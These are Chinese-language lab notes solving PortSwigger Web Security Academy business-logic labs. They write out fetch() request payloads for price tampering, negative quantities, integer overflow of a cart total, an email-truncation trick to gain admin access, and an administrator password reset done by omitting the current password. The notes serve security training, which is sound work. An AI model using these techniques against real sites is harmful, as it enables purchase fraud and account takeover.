---
title: Business logic vulnerabilities
description: Business logic vulnerabilities
---

## Lab: Excessive trust in client-side controls

| Dimension | Description                                                                                                       |
| --------- | ----------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#excessive-trust-in-client-side-controls                 |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls |

加入購物車的時候沒檢查金額

```js
fetch(
  "https://0a9d00d00396c1b68117c54f00c40012.web-security-academy.net/cart",
  {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: "productId=1&redir=PRODUCT&quantity=1&price=100",
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

## Lab: High-level logic vulnerability

| Dimension | Description                                                                                       |
| --------- | ------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#excessive-trust-in-client-side-controls |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level              |

加入購物車的時候沒檢查數量，負數可以讓金額變成負的

```js
fetch(
  "https://0aba0073033e80add0cca0af00fe0071.web-security-academy.net/cart",
  {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: "productId=2&redir=PRODUCT&quantity=-26",
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

## Lab: Low-level logic flaw

| Dimension | Description                                                                                       |
| --------- | ------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#excessive-trust-in-client-side-controls |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level               |

這題的 Hint

```
You will need to use Burp Intruder (or Turbo Intruder) to solve this lab.

To make sure the price increases in predictable increments, we recommend configuring your attack to only send one request at a time. In Burp Intruder, you can do this from the resource pool settings using the Maximum concurrent requests option.
```

根據線索，立馬想到是 Integer overflow，如果金額 > 2147483647 的話，也許就會變成負數，所以題目才說建議用 Burp Intruder 來解，並且要觀察價格的變化

這題我發現庫存有檢核 `quantity < 100`，於是我選擇用 JS 每次 80 來跑

```js
async function addToCart() {
  return fetch(
    "https://0a3c00bb0333802fd03fbe0d009000ac.web-security-academy.net/cart",
    {
      headers: {
        "content-type": "application/x-www-form-urlencoded",
      },
      body: "productId=1&redir=PRODUCT&quantity=80",
      method: "POST",
      mode: "cors",
      credentials: "include",
      redirect: "manual",
    },
  );
}
```

| UnitPrice | Quantity | TotalPrice    |
| --------- | -------- | ------------- |
| $1337.00  | 16061    | $21473557.00  |
| $1337.00  | 16062    | -$21474778.96 |
| $1337.00  | 32124    | $115.04       |

但我們的金額只有 $100，所以稍微調整一下購物車，購買其他品項，成功壓在 $100 元以內～

## Lab: Inconsistent handling of exceptional input

| Dimension | Description                                                                                                          |
| --------- | -------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#excessive-trust-in-client-side-controls                    |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input |

這題有一些線索

- If you work for DontWannaCry, please use your @dontwannacry.com email address
- Displaying all emails @exploit-0a8800ef0328a813843a053a01ca0071.exploit-server.net and all subdomains

結合以上，我構造了 `xxx@dontwannacry.com.exploit-0a8800ef0328a813843a053a01ca0071.exploit-server.net` 的 email，但還是沒有取得 Admin panel 的權限

同時，我也嘗試用 username = `administrator` 來註冊，但是會顯示 `An account already exists with that username`

後來參考答案後，我才意識到我差了臨門一角～

這題利用的是長度 255 會被截斷的特性

構造

```js
Array(255 - "@dontwannacry.com".length)
  .fill(1)
  .join("") +
  "@dontwannacry.com.exploit-0a8800ef0328a813843a053a01ca0071.exploit-server.net";
```

可以成功收到註冊信，但是登入後，剛好會被截斷成 `111......111@dontwannacry.com`，然後就可以取得 Admin panel 權限了

這題的 Bypass 手法真的很妙，我從來沒想過可以這樣幹XDD

## Lab: Inconsistent security controls

| Dimension | Description                                                                                              |
| --------- | -------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#making-flawed-assumptions-about-user-behavior  |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls |

這題跟上一題一樣，都有註冊功能 + Email Client + @dontwannacry.com 可以訪問 Admin panel 的設定

先正常註冊，之後再 update email 改成 xxx@dontwannacry.com 就可以成功訪問 Admin panel～

## Lab: Weak isolation on dual-use endpoint

| Dimension | Description                                                                                                   |
| --------- | ------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/logic-flaws/examples#users-won-t-always-supply-mandatory-input           |
| Lab       | https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint |

這題有點神奇，直接拿掉 `current-password`，竟然就不檢核了，可以直接修改 `administrator` 的密碼

```js
fetch(
  "https://0a9100cc040045e080709e79007d00e3.web-security-academy.net/my-account/change-password",
  {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: "csrf=OBWNVzxgoTDZXBYR13Z8wc3gUcXZBBK9&username=administrator&new-password-1=administrator&new-password-2=administrator",
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

## 參考資料

- https://portswigger.net/web-security/host-header
